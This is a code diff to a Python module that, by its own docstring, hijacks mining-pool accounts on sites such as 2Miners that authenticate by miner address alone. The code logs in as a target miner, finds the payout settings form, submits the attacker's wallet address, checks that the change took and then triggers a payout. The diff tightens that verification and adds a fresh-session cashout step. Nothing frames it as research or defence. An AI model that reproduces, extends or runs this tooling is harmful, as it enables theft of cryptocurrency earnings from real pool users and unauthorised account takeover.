@@ -2,11 +2,14 @@
 
 Pools like 2Miners authenticate with the miner address alone, so a discovered
 target can be taken with no credential. Warm cookies, find the login field, log
-in once, find the payout form, replay it with our wallet, confirm, fire payout.
+in once, find the payout form, replay it with our wallet, verify the field really
+changed, then fire the payout.
 """
 import re
 import httpx
 from bs4 import BeautifulSoup
+
+from . import notify, verify
 
 UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
       "(KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1")
@@ -60,7 +63,6 @@ def current_payout(html):
 
 
 async def _login(c, base, miner):
-    """Read the login form's real field name, fall back to guesses."""
     fields = []
     try:
         r = await c.get(base + "/login")
@@ -125,6 +127,7 @@ async def takeover(spec, miner, new_addr, log):
             return "fail", f"warmup:{type(e).__name__}"
         if not await _login(c, base, miner):
             return "fail", "login blocked"
+        posted = None
         for p in ("/account", "/account/settings", "/settings"):
             try:
                 r = await c.get(base + p)
@@ -137,23 +140,32 @@ async def takeover(spec, miner, new_addr, log):
                 url = action if action.startswith("http") else base + action
                 try:
                     if (f.get("method") or "post").lower() == "post":
-                        rr = await c.post(url, data=_payload(f, new_addr))
+                        await c.post(url, data=_payload(f, new_addr))
                     else:
-                        rr = await c.get(url, params=_payload(f, new_addr))
+                        await c.get(url, params=_payload(f, new_addr))
+                    posted = url
                 except Exception as e:
                     log(f"submit {url}: {type(e).__name__}")
-                    continue
-                if new_addr.lower() in rr.text.lower():
-                    fired, where = await _cashout(c, base)
-                    return "ok", f"swapped {url}" + (f" + payout {where}" if fired else "")
+
+    ok, detail = await verify.confirms(spec, miner, new_addr)
+    if not ok:
+        return "fail", f"{detail} (posted {posted or 'none'})"
+    fired, where = await _cashout_fresh(spec, miner)
+    if fired:
+        return "ok", f"{detail} + payout {where}"
+    return "ok", f"{detail} (payout not due)"
+
+
+async def _cashout_fresh(spec, miner):
+    base = "https://" + spec["host"]
+    async with httpx.AsyncClient(headers={"User-Agent": UA}, follow_redirects=True,
+                                 timeout=TIMEOUT) as c:
         try:
-            v = await c.get(base + "/account")
-            if new_addr.lower() in v.text.lower():
-                fired, where = await _cashout(c, base)
-                return "ok", "verified" + (f" + payout {where}" if fired else "")
+            await c.get(base + "/")
+            await _login(c, base, miner)
+            return await _cashout(c, base)
         except Exception:
-            pass
-        return "fail", "no payout form"
+            return False, ""
 
 
 async def probe(spec, miner):
